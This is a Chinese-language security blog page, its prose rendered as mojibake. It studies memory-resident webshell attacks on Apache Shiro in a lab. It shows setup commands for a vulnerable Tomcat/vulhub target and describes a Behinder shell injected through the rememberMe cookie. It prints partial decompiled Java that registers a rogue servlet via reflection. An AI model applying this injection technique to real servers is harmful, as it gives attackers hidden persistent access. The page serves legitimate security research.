<!DOCTYPE html>
<html>
<style>
.navbar-hide{
	display: none;
}
</style>
	<head>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Â© å…³äºå“¨å…µï¼Œè¿™æ˜¯ä¸€ä¸ªä¸å“¨å…µå®‰å…¨ç›¸å…³çš„ç®€è¿°ã€‚">
<meta name="keywords" content="ç½‘ç»œå®‰å…¨,å“¨å…µå®‰å…¨,Cyber Security,Open Source">
<meta name="author" content="Sentry Security">
<link rel="shortcut icon" href="/static/img/favicon.png">
<title> åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶  Â© å…³äºå“¨å…µ | å“¨å…µå®‰å…¨å®éªŒå®¤</title>
<!--<base target="_blank" />-->
<link rel="stylesheet" href="/static/css/bootstrap.css">
<link rel="stylesheet" href="/static/css/bootstrap-select.min.css">
<link rel="stylesheet" href="/static/css/font-awesome.min.css" >
<link rel="stylesheet" href="/static/css/spinkit.css">
<link rel="stylesheet" href="/static/css/style.css">
<link rel="stylesheet" type="text/css" href="/static/css/pace-minimal.css">

<script src="/static/js/jquery.min.js"></script>
<!--jquery sticky js source files add-->
<script src="/static/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
<!--jquery sticky js source files add stop-->
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/bootstrap-select.min.js"></script>
<script src="/static/js/pace.min.js"></script>

<!--start-->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
        inlineMath: [['$$','$$']]
      }
    });
  </script>
<script src="/static/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<!--https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js shuxue gongshi. stop-->

<script src="/static/js/vue.min.js"></script>
<script src="/static/js/timeago.min.js"></script>

<script src="/static/js/markup.min.js"></script>
<script src="/static/js/webfont.js"></script>
<script src="/static/js/thuhidden.js"></script>

</head>

<body>
	<div class="navbar navbar-default" role="navigation">
  <div class="container">
    <div class="navbar-header">
      
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      
			<a class="navbar-brand" href="/">
				<span class="thuhidden">
					
					<picture>
						
						<source 
						
							srcset="/static/img/logo-small-dark.png 1x,
											/static/img/logo-small-dark@2x.png 2x,
											/static/img/logo-small-dark@3x.png 3x,
											/static/img/logo-small-dark@4x.png 4x"
						
							media="(prefers-color-scheme: dark)"/>
						
						
						<img src="/static/img/logo-small.png" 
							srcset="/static/img/logo-small.png 1x, 
											/static/img/logo-small@2x.png 2x, 
											/static/img/logo-small@3x.png 3x, 
											/static/img/logo-small@4x.png 4x"
							alt=""/>
						
					</picture>
					
					</span>å…³äºæˆ‘çš„ä¸€äº›è‡ªè¿°
			</a>
    </div>
    <div class="navbar-collapse collapse navbar-right">
      <ul class="nav navbar-nav" role="menubar">
        
        
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn">HOME</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/blog">BLOG</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/events">EVENT</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/categories">CATEGORIES</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/daily">DAILY</a></li>
        <li class="active"><a href="/">ABOUT ME</a></li>

        
       
      </ul>
    </div><!--/.nav-collapse -->
  </div>
</div>




<script>
	window.mirrorId = "åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶";
</script>


<div id="help-page">
	<div class="container">
	  <div class="row">
		  <div class="col-sm-3 hidden-xs">
				<ul class="nav nav-pills nav-stacked" id="help-nav">
					
					<li id="toc-ATT&CK - åŸºäº scylla çš„è®¿é—®ä»£ç†æ± "><a href="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/"><code-index-css>ATT&CK - åŸºäº scylla çš„è®¿é—®ä»£ç†æ± </code-index-css></a></li>
					
					<li id="toc-CTF - ä»£ç å®¡è®¡å‘"><a href="/help/CTF-Code-Audit-WalkThrough/"><code-index-css>CTF - ä»£ç å®¡è®¡å‘</code-index-css></a></li>
					
					<li id="toc-CTF - å¯†ç å­¦ä¸æ‚é¡¹"><a href="/help/CTF-Crypto-and-Misc-etc-WalkThrough/"><code-index-css>CTF - å¯†ç å­¦ä¸æ‚é¡¹</code-index-css></a></li>
					
					<li id="toc-Dynamic-analysis-of-java-framework-code"><a href="/help/Dynamic-analysis-of-java-framework-code/"><code-index-css>Dynamic-analysis-of-java-framework-code</code-index-css></a></li>
					
					<li id="toc-Hikvision-ConfigurationFiles-decrypter"><a href="/help/Hikvision-ConfigurationFiles-decrypter/"><code-index-css>Hikvision-ConfigurationFiles-decrypter</code-index-css></a></li>
					
					<li id="toc-JRMP-Gadget"><a href="/help/JRMP-Gadget/"><code-index-css>JRMP-Gadget</code-index-css></a></li>
					
					<li id="toc-Mod-Waf-Bypass-Walkthrough"><a href="/help/Mod-Waf-Bypass-Walkthrough/"><code-index-css>Mod-Waf-Bypass-Walkthrough</code-index-css></a></li>
					
					<li id="toc-ModSec & CloudFlare WAF Initial Research"><a href="/help/WAF-developed-by-Grayscale-forwarding/"><code-index-css>ModSec & CloudFlare WAF Initial Research</code-index-css></a></li>
					
					<li id="toc-Router-BinFile-Analysis"><a href="/help/Router-BinFile-Analysis/"><code-index-css>Router-BinFile-Analysis</code-index-css></a></li>
					
					<li id="toc-SQLæ³¨å…¥åŸç†åˆ†æ"><a href="/help/ALL-SQL-INJECTION-ANALYSIS/"><code-index-css>SQLæ³¨å…¥åŸç†åˆ†æ</code-index-css></a></li>
					
					<li id="toc-ShiroDeser"><a href="/help/ShiroDeser/"><code-index-css>ShiroDeser</code-index-css></a></li>
					
					<li id="toc-SpringBoot-Memory-files-heapdump-Analysis"><a href="/help/SpringBoot-Memory-files-heapdump-Analysis/"><code-index-css>SpringBoot-Memory-files-heapdump-Analysis</code-index-css></a></li>
					
					<li id="toc-Struts2Deser"><a href="/help/Struts2Deser/"><code-index-css>Struts2Deser</code-index-css></a></li>
					
					<li id="toc-javaDeser"><a href="/help/javaDeser/"><code-index-css>javaDeser</code-index-css></a></li>
					
					<li id="toc-polkit-CVE-2021-3560"><a href="/help/polkit-CVE-2021-3560/"><code-index-css>polkit-CVE-2021-3560</code-index-css></a></li>
					
					<li class="active" id="toc-åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶"><a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/"><code-index-css>åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶</code-index-css></a></li>
					
					<li id="toc-å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™"><a href="/help/ALL-mvn-build-errors/"><code-index-css>å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™</code-index-css></a></li>
					
					<li id="toc-æµªæ½®ClusterEngineV4.0ä»£ç å®¡è®¡å†ç¨‹"><a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/"><code-index-css>æµªæ½®ClusterEngineV4.0ä»£ç å®¡è®¡å†ç¨‹</code-index-css></a></li>
					
					<li id="toc-é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æ"><a href="/help/ToDa-OA-VulnPoc-by-java-analysis/"><code-index-css>é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æ</code-index-css></a></li>
					
				</ul>
				
				
				<div id="sticky-wrapper" class="sticky-wrapper" style="height: 200px;">
					<li class="nav nav-pills nav-stacked" id="help-nav">
						<code-index-css>
							<details open class="article-index" style="overflow: visible;">
								<summary class="point">æ–‡ç« ç›®å½•&nbsp &nbsp</summary>
								<div class="hline"></div>
								<div class="spacing"></div>
								<ul id="toc" class="section-nav">
<li class="toc-entry toc-h1"><a href="#åŸºäºå†…å­˜çš„shiroæ¡†æ¶webshellæ”»å‡»ç ”ç©¶">åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶</a>
<ul>
<li class="toc-entry toc-h2"><a href="#é›¶shiroæ¡†æ¶éƒ¨ç½²">é›¶ï¼šShiroæ¡†æ¶éƒ¨ç½²</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-0x01idea-tomcatè°ƒè¯•éƒ¨ç½²"># 0x01ï¼šIDEA tomcatè°ƒè¯•éƒ¨ç½²</a></li>
<li class="toc-entry toc-h4"><a href="#-0x02docker-composeéƒ¨ç½²"># 0x02ï¼šdocker composeéƒ¨ç½²</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#ä¸€shiroæ¡†æ¶æ”»å‡»">ä¸€ï¼šShiroæ¡†æ¶æ”»å‡»</a>
<ul>
<li class="toc-entry toc-h4"><a href="#1x01æ‰‹åŠ¨poc">1x01ï¼šæ‰‹åŠ¨poc</a></li>
<li class="toc-entry toc-h4"><a href="#1x02å·¥å…·poc">1x02ï¼šå·¥å…·poc</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#äºŒåŸºäºtomcatçš„é€šç”¨å›æ˜¾ä¹‹å†°èå†…å­˜é©¬">äºŒï¼šåŸºäºtomcatçš„é€šç”¨å›æ˜¾ä¹‹å†°èå†…å­˜é©¬</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-2x01æ”»å‡»æµ‹è¯•"># 2x01ï¼šæ”»å‡»æµ‹è¯•</a></li>
<li class="toc-entry toc-h4"><a href="#-2x02åˆ©ç”¨åŸç†"># 2x02ï¼šåˆ©ç”¨åŸç†</a></li>
</ul>
</li>
</ul>
</li>
</ul>
							</details>
						</code-index-css>
					</li>
				</div>
				 


				<!--click this icon -> scroll to top of page; code from anquanke. also this icon func are under-construction-->		
				<!-- <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:400px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
					<img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
				</div> -->


			</div><!-- sidenave -->
			<div class="col-sm-9">
				<div class="visible-xs">
					<form class="form-inline">
						<div class="form-group">
							<label>é€‰æ‹©: </label>
							<select class="form-control" id="help-select">
								
								<option data-help-url="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/" id="toc-ATT&CK - åŸºäº scylla çš„è®¿é—®ä»£ç†æ± ">ATT&CK - åŸºäº scylla çš„è®¿é—®ä»£ç†æ± </option>
								
								<option data-help-url="/help/CTF-Code-Audit-WalkThrough/" id="toc-CTF - ä»£ç å®¡è®¡å‘">CTF - ä»£ç å®¡è®¡å‘</option>
								
								<option data-help-url="/help/CTF-Crypto-and-Misc-etc-WalkThrough/" id="toc-CTF - å¯†ç å­¦ä¸æ‚é¡¹">CTF - å¯†ç å­¦ä¸æ‚é¡¹</option>
								
								<option data-help-url="/help/Dynamic-analysis-of-java-framework-code/" id="toc-Dynamic-analysis-of-java-framework-code">Dynamic-analysis-of-java-framework-code</option>
								
								<option data-help-url="/help/Hikvision-ConfigurationFiles-decrypter/" id="toc-Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</option>
								
								<option data-help-url="/help/JRMP-Gadget/" id="toc-JRMP-Gadget">JRMP-Gadget</option>
								
								<option data-help-url="/help/Mod-Waf-Bypass-Walkthrough/" id="toc-Mod-Waf-Bypass-Walkthrough">Mod-Waf-Bypass-Walkthrough</option>
								
								<option data-help-url="/help/WAF-developed-by-Grayscale-forwarding/" id="toc-ModSec & CloudFlare WAF Initial Research">ModSec & CloudFlare WAF Initial Research</option>
								
								<option data-help-url="/help/Router-BinFile-Analysis/" id="toc-Router-BinFile-Analysis">Router-BinFile-Analysis</option>
								
								<option data-help-url="/help/ALL-SQL-INJECTION-ANALYSIS/" id="toc-SQLæ³¨å…¥åŸç†åˆ†æ">SQLæ³¨å…¥åŸç†åˆ†æ</option>
								
								<option data-help-url="/help/ShiroDeser/" id="toc-ShiroDeser">ShiroDeser</option>
								
								<option data-help-url="/help/SpringBoot-Memory-files-heapdump-Analysis/" id="toc-SpringBoot-Memory-files-heapdump-Analysis">SpringBoot-Memory-files-heapdump-Analysis</option>
								
								<option data-help-url="/help/Struts2Deser/" id="toc-Struts2Deser">Struts2Deser</option>
								
								<option data-help-url="/help/javaDeser/" id="toc-javaDeser">javaDeser</option>
								
								<option data-help-url="/help/polkit-CVE-2021-3560/" id="toc-polkit-CVE-2021-3560">polkit-CVE-2021-3560</option>
								
								<option data-help-url="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" selected id="toc-åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶">åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶</option>
								
								<option data-help-url="/help/ALL-mvn-build-errors/" id="toc-å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™">å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™</option>
								
								<option data-help-url="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" id="toc-æµªæ½®ClusterEngineV4.0ä»£ç å®¡è®¡å†ç¨‹">æµªæ½®ClusterEngineV4.0ä»£ç å®¡è®¡å†ç¨‹</option>
								
								<option data-help-url="/help/ToDa-OA-VulnPoc-by-java-analysis/" id="toc-é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æ">é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æ</option>
								
							</select>
						</div>
					</form>
				</div>
				<div id="help-content">

				<center>
					
					<csmall>æœ¬æ–‡æœ€åä¿®æ”¹äºï¼š<em>2021-03-10</em></csmall>
					
				<csmall><em> | Sentry Security | å“¨å…µå®‰å…¨å®éªŒå®¤</em></csmall>
				</center>

					<div class="hline"></div>
					<div class="spacing"></div>

					<h1 id="åŸºäºå†…å­˜çš„shiroæ¡†æ¶webshellæ”»å‡»ç ”ç©¶">åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶</h1>

<ul>
  <li>âœ…Shiroæ¡†æ¶éƒ¨ç½²
    <ul>
      <li>IDEA tomcatè°ƒè¯•éƒ¨ç½²</li>
      <li>docker compose</li>
    </ul>
  </li>
  <li>âœ…Shiroæ¡†æ¶æ”»å‡»
    <ul>
      <li>æ‰‹åŠ¨poc</li>
      <li>å·¥å…·poc</li>
    </ul>
  </li>
  <li>âœ…åŸºäºtomcatçš„é€šç”¨å›æ˜¾
    <ul>
      <li>tomcatå†°èå†…å­˜é©¬
        <ul>
          <li>åˆ©ç”¨åŸç†</li>
          <li>æ”»å‡»æµ‹è¯•</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>âœ…ç»™ğŸ‘´è¿ï¼</li>
</ul>

<h2 id="é›¶shiroæ¡†æ¶éƒ¨ç½²">é›¶ï¼šShiroæ¡†æ¶éƒ¨ç½²</h2>
<p>ç°å¦‚ä»Šéƒ¨ç½²ä¸€ä¸ªé¶åœºçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå–å†³äºä¸ªäººå–œå¥½å’Œéœ€æ±‚ï¼›æˆ‘ç»“åˆä¸ªäººèƒ½åŠ›åšå‡ºäº†ä¸€äº›æ€»ç»“ï¼š</p>

<table class="table">
  <thead>
    <tr>
      <th>ç‰¹ç‚¹\éƒ¨ç½²åŠæ³•</th>
      <th>1.docker-compose</th>
      <th>2.IDEA tomcatè°ƒè¯•éƒ¨ç½²</th>
      <th>3.ã€Œdocker+IDEAã€</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>å¿«æ·ç¨‹åº¦</td>
      <td>å‡ æ¡å‘½ä»¤å¿«æ·éƒ¨ç½²</td>
      <td>éœ€å¼€æ”¾è°ƒè¯•ç«¯å£+tomcat waråŒ…(å¦‚æ— åˆ™éœ€æºç æ„å»º)</td>
      <td>ä½ æ‡‚çš„</td>
    </tr>
    <tr>
      <td>èƒ½å¦è°ƒè¯•</td>
      <td>â</td>
      <td>âœ…</td>
      <td>âœ…</td>
    </tr>
    <tr>
      <td>è‡ªå®šä¹‰é¶åœºï¼ˆå¦‚é¡µé¢ï¼‰</td>
      <td>â</td>
      <td>âœ…</td>
      <td>âœ…</td>
    </tr>
  </tbody>
</table>

<h4 id="-0x01idea-tomcatè°ƒè¯•éƒ¨ç½²"># 0x01ï¼šIDEA tomcatè°ƒè¯•éƒ¨ç½²</h4>
<p>æœ¬ç¯‡æ–‡ç« ä¼šä¾§é‡æè¿°å¦‚ä½•è¿›è¡Œé’ˆå¯¹IDEAçš„tomcatè°ƒè¯•éƒ¨ç½²ï¼›</p>

<ul>
  <li>å…‹éš†æºç 
    <ul>
      <li>ä»¥shiro-721ä¸ºä¾‹ï¼š
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.4.1
mvn install
cd samples/web
mvn install
</code></pre></div>        </div>
      </li>
      <li>æ‰¾åˆ°<code class="language-plaintext highlighter-rouge">{path-to-shiro}/samples/web/target</code>ç›®å½•ä¸‹çš„waråŒ…å¤åˆ¶åˆ°tomcat webappsç›®å½•ä¸‹ï¼š
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ tree
target
Â·Â·
â”‚Â Â  â”œâ”€â”€ index.jsp
â”‚Â Â  â”œâ”€â”€ login.jsp
â”‚Â Â  â”œâ”€â”€ logout.jsp
â”‚Â Â  â””â”€â”€ style.css
â”œâ”€â”€ samples-web-1.4.1.war
    
$ cp samples/web/target/samples-web-1.4.1.war {path-to-tomcat}/webapps/
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>å¼€æ”¾tomcatè°ƒè¯•ç«¯å£ï¼š
    <ul>
      <li>æ‰¾åˆ°<code class="language-plaintext highlighter-rouge">bin/catalina.sh</code>æ–‡ä»¶ä¸­çš„<code class="language-plaintext highlighter-rouge">JAVA_OPTS</code>ï¼ˆä¼šæœ‰å¤šä¸ªï¼‰ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JAVA_OPTS="$JAVA_OPTS $JSSE_OPTS"
      
# Register custom URL handlers
# Do this here so custom URL handles (specifically 'war:...') can be used in the security policy
JAVA_OPTS="$JAVA_OPTS -Djava.protocol.handler.pkgs=org.apache.catalina.webresources"
CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y"
#ä¸Šé¢çš„CATALINA_OPTSä¸ºæ–°å¢ï¼›addressä¸ºè°ƒè¯•ç«¯å£ï¼Œå¯è‡ªè¡Œæ›´æ”¹ã€‚
</code></pre></div>        </div>
      </li>
      <li><code class="language-plaintext highlighter-rouge">bin/startup.sh</code>å¯åŠ¨ï¼Œçœ‹åˆ°ä»¥ä¸‹æ—¥å¿—æ‰“å°åˆ™å¼€æ”¾è°ƒè¯•æˆåŠŸï¼š
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ tail -f logs/catalina.out
Listening for transport dt_socket at address: 5555
10-Mar-2021 09:51:16.763 ä¿¡æ¯ [main] org.apache.catalina.startup.VersionLoggerListener.log Server.æœåŠ¡å™¨ç‰ˆæœ¬: Apache Tomcat/8.5.57
Â·Â·Â·
10-Mar-2021 09:51:16.769 ä¿¡æ¯ [main] org.apache.catalina.startup.VersionLoggerListener.log å‘½ä»¤è¡Œå‚æ•°ï¼š-Xdebug
10-Mar-2021 09:51:16.769 ä¿¡æ¯ [main] org.apache.catalina.startup.VersionLoggerListener.log å‘½ä»¤è¡Œå‚æ•°ï¼š-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>IDEA+tomcatè°ƒè¯•ï¼š
    <ul>
      <li>IDEAé…ç½®ï¼ˆæ·»åŠ serveræ—¶ä¸º<code class="language-plaintext highlighter-rouge">Tomcat Server</code>-&gt;<code class="language-plaintext highlighter-rouge">Remote</code>ï¼‰ï¼š
  <img src="/static/web-image/webshell-mem/idea-tomcat-conf.png" alt="" /></li>
      <li>å¦‚ä¸‹å›¾ï¼ŒåŠ ä¸Š<code class="language-plaintext highlighter-rouge">home.jsp</code>æ–­ç‚¹åè¿›è¡Œhttpè¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°IDEAä¸­è¿”å›çš„framesè¯¦æƒ…ï¼›
  <img src="/static/web-image/webshell-mem/remote-debug-pic.png" alt="" /></li>
    </ul>
  </li>
</ul>

<p>è¿™æ ·åŸºæœ¬ä¸Šä¸€ä¸ªåŸºæœ¬çš„IDEA+tomcatçš„è°ƒè¯•é…ç½®è¿‡ç¨‹åŸºæœ¬å°±å®Œæˆäº†ï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯è°ƒè¯•å‰çš„å‡†å¤‡å·¥ä½œï¼Œå¤§å®¶å¤šç»ƒä¹ å‡ æ¬¡ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¤Ÿç†Ÿç»ƒæŒæ¡ï¼›è€Œæœ€é‡è¦çš„ä»¥åŠæœ€éš¾çš„å…¶å®æ˜¯è°ƒè¯•é˜¶æ®µï¼Œ
è°ƒè¯•è¿‡ç¨‹ä¸­çš„ä¸€äº›æŠ€å·§å’Œèƒ½åŠ›æ˜¯åœ¨ä¸€æ¬¡æ¬¡çš„å®è·µä¸­æ²‰æ·€ä¸‹æ¥çš„ï¼Œåœ¨è¿™é‡Œä»…ä»…å½“ä½œæŠ›ç –å¼•ç‰ï¼Œä¸åšèµ˜è¿°ã€‚</p>

<h4 id="-0x02docker-composeéƒ¨ç½²"># 0x02ï¼šdocker composeéƒ¨ç½²</h4>

<ul>
  <li>å‡†å¤‡å·¥ä½œ
    <ul>
      <li>æ ¹æ®ä¸åŒæ“ä½œç³»ç»Ÿä¸‹è½½å®‰è£…dockerï¼›</li>
      <li>å®‰è£…<code class="language-plaintext highlighter-rouge">python-&gt;pip-&gt;docker-compose</code>ï¼Œæ•™ç¨‹è‡ªè¡Œæœç´¢:)</li>
    </ul>
  </li>
  <li>ä¸‹è½½é¶åœº
    <ul>
      <li>vulhub based on dockerï¼š
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/vulhub/vulhub.git
$ cd vulhub/shiro/CVE-2016-4437/
$ docker-compose up -d
</code></pre></div>        </div>
        <p>ç­‰å¾…å¯åŠ¨å³å¯ã€‚</p>
      </li>
    </ul>
  </li>
</ul>

<h2 id="ä¸€shiroæ¡†æ¶æ”»å‡»">ä¸€ï¼šShiroæ¡†æ¶æ”»å‡»</h2>
<p>pocä»£ç ç”Ÿæˆæ”»å‡»cookieå¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š</p>
<h4 id="1x01æ‰‹åŠ¨poc">1x01ï¼šæ‰‹åŠ¨poc</h4>
<p><a href="/help/ShiroDeser/#2x03how-to-poc" target="_blank">åˆ†äº«ï¼šDifferent Shiro Framework deserialization analysis ideas#how to poc</a></p>
<h4 id="1x02å·¥å…·poc">1x02ï¼šå·¥å…·poc</h4>
<p><a href="/help/ShiroDeser/#%E4%BA%8C%E9%AA%8C%E8%AF%81" target="_blank">åˆ†äº«ï¼šDifferent Shiro Framework deserialization analysis ideas#éªŒè¯</a></p>

<h2 id="äºŒåŸºäºtomcatçš„é€šç”¨å›æ˜¾ä¹‹å†°èå†…å­˜é©¬">äºŒï¼šåŸºäºtomcatçš„é€šç”¨å›æ˜¾ä¹‹å†°èå†…å­˜é©¬</h2>
<p>è¿™ä¸€å°èŠ‚ç”±äºä¸ªäººæ°´å¹³æœ‰é™ï¼Œä¸èƒ½åƒå„ä½å¸ˆå‚…ä¸€æ ·ä»tomcat servletç­‰å±‚é¢ä¸€æ¢ç©¶ç«Ÿï¼Œæˆ‘å°½é‡ä½¿ç”¨ç®€æ´çš„è¯­è¨€å†™å‡ºæˆ‘çš„ç†è§£ï¼›</p>
<h4 id="-2x01æ”»å‡»æµ‹è¯•"># 2x01ï¼šæ”»å‡»æµ‹è¯•</h4>
<p>å·¥å…·ç›´æ¥é€‰æ‹©â€å†°è2_Tomcatâ€ï¼Œæ‰§è¡Œæ³¨å…¥ï¼›</p>
<ul>
  <li>
    <p>httpå‘åŒ…è¯·æ±‚å¦‚ä¸‹ï¼š
<img src="/static/web-image/webshell-mem/behinder-post-request.png" alt="" />
æˆ‘ä»¬å¯ä»¥çœ‹åˆ°HTTPè¯·æ±‚ä¸ºPOSTè¯·æ±‚<code class="language-plaintext highlighter-rouge">p</code>&amp;<code class="language-plaintext highlighter-rouge">path</code>&amp;<code class="language-plaintext highlighter-rouge">dy</code>æ•°æ®ï¼›åŒæ—¶headerä¸­åŠ å…¥äº†<code class="language-plaintext highlighter-rouge">rememberMe Cookie</code>ï¼›</p>
  </li>
  <li>
    <p>åˆ†æï¼š
Cookieæ˜¯ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ï¼Œ<code class="language-plaintext highlighter-rouge">dy</code>å‚æ•°åº”è¯¥æ˜¯å†™å…¥å†…å­˜çš„å‘½ä»¤</p>
  </li>
</ul>

<p>åŒæ—¶æœ€åè¿”å›<code class="language-plaintext highlighter-rouge">dynamic inject success</code>ï¼›</p>

<ul>
  <li>æ³¨å…¥æˆåŠŸæ•ˆæœï¼š
<img src="/static/web-image/webshell-mem/webshell-mem-display.png" alt="" /></li>
</ul>

<h4 id="-2x02åˆ©ç”¨åŸç†"># 2x02ï¼šåˆ©ç”¨åŸç†</h4>
<p>æˆ‘ä»¬æŠŠåˆ©ç”¨å·¥å…·çš„jaråŒ…æ‰”è¿›åç¼–è¯‘è½¯ä»¶å®šä½åˆ°<code class="language-plaintext highlighter-rouge">BehOldDemoServlert.class</code>ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä»£ç æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼š</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">dynamicAddServlet</span><span class="o">(</span><span class="nc">ServletContext</span> <span class="n">servletContext</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="nc">Method</span> <span class="n">method</span><span class="o">;</span>
    <span class="nc">String</span> <span class="n">wrapperName</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">path</span><span class="o">;</span>
    <span class="nc">ApplicationContextFacade</span> <span class="n">applicationContextFacade</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ApplicationContextFacade</span><span class="o">)</span><span class="n">servletContext</span><span class="o">;</span>
    <span class="nc">Field</span> <span class="n">applicationContextField</span> <span class="o">=</span> <span class="n">applicationContextFacade</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
    <span class="n">applicationContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="nc">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ApplicationContext</span><span class="o">)</span><span class="n">applicationContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContextFacade</span><span class="o">);</span>
    <span class="nc">Field</span> <span class="n">standardContextField</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
    <span class="n">standardContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="nc">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="nc">StandardContext</span><span class="o">)</span><span class="n">standardContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
    <span class="nc">Object</span> <span class="n">newWrapper</span> <span class="o">=</span> <span class="n">invoke</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="s">"createWrapper"</span><span class="o">,</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span><span class="kc">null</span><span class="o">);</span>
    <span class="n">invoke</span><span class="o">(</span><span class="n">newWrapper</span><span class="o">,</span> <span class="s">"setName"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">wrapperName</span> <span class="o">});</span>
    <span class="n">setFieldValue</span><span class="o">(</span><span class="n">newWrapper</span><span class="o">,</span> <span class="s">"instance"</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
